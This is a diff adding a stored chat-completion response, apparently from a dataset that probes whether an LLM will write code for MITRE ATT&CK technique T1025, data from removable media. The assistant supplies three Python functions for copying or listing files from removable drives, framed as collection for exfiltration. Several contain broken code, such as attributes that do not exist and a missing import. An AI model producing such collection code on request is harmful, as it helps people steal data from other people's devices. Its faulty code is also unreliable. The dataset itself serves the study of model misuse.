@@ -1,0 +1,22 @@
+{
+  "id":"chatcmpl-8UDiOZIYvZ0TdgqGbHzFZQIAKIR9O",
+  "object":"chat.completion",
+  "created":1702213252,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[Feasible]\nT1025-Data from Removable Media\n\nMethod 1:\nPackages Used: os, shutil\n\n1. Use the os module to list all available drives connected to the system.\n2. Iterate through each drive and check if it is a removable media.\n3. If a removable media is found, use the shutil module to copy files of interest to a specified location.\n4. Exfiltrate the collected files if necessary.\n\nFunction:\n\n```python\nimport os\nimport shutil\n\ndef collect_files_from_removable_media(destination_folder):\n    removable_drives = [drive for drive in os.listdir() if os.path.ismount(drive) and 'removable' in drive]\n    \n    for drive in removable_drives:\n        for root, dirs, files in os.walk(drive):\n            for file in files:\n                file_path = os.path.join(root, file)\n                shutil.copy2(file_path, destination_folder)\n```\n\nUsage:\n\n```python\ncollect_files_from_removable_media(\"C:/DestinationFolder\")\n```\n\nMethod 2:\nPackages Used: subprocess\n\n1. Use the subprocess module to execute a command that lists all available drives.\n2. Iterate through each drive and check if it is a removable media.\n3. Use the subprocess module to execute a command that searches for files of interest on the removable media.\n4. Exfiltrate the collected files if necessary.\n\nFunction:\n\n```python\nimport subprocess\n\ndef collect_files_from_removable_media(destination_folder):\n    # List available drives\n    drives_output = subprocess.check_output('wmic logicaldisk get caption', shell=True)\n    drives = [drive for drive in drives_output.decode().split('\\n') if drive]\n\n    # Iterate through each drive\n    for drive in drives[1:]:\n        # Check if it is a removable media\n        drive_type_output = subprocess.check_output(f'wmic logicaldisk where caption=\"{drive}\" get drivetype', shell=True)\n        drive_type = int(drive_type_output.decode().split('\\n')[1])\n        if drive_type == 2:  # Drive type 2 represents removable media\n            # Search for files of interest\n            subprocess.check_output(f'cmd /c dir /s /b {drive}:\\\\* > \"{destination_folder}/{drive[0]}_files.txt\"', shell=True)\n```\n\nUsage:\n\n```python\ncollect_files_from_removable_media(\"C:/DestinationFolder\")\n```\n\nMethod 3:\nPackages Used: pathlib\n\n1. Use the pathlib module to list all available drives connected to the system.\n2. Iterate through each drive and check if it is a removable media.\n3. Use the pathlib module to search for files of interest on the removable media.\n4. Exfiltrate the collected files if necessary.\n\nFunction:\n\n```python\nfrom pathlib import Path\n\ndef collect_files_from_removable_media(destination_folder):\n    removable_drives = [drive for drive in Path.cwd().iterdir() if drive.drive_type == Path.DRIVE_REMOVABLE]\n    \n    for drive in removable_drives:\n        for file in drive.rglob('*'):\n            if file.is_file():\n                destination_file = Path(destination_folder) / Path(f\"{drive.stem}_files\") / file.relative_to(drive)\n                destination_file.parent.mkdir(exist_ok=True, parents=True)\n                shutil.copy2(file, destination_file)\n```\n\nUsage:\n\n```python\ncollect_files_from_removable_media(\"C:/DestinationFolder\")\n```"
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":383,
+    "completion_tokens":701,
+    "total_tokens":1084
+  },
+  "system_fingerprint":null
+}
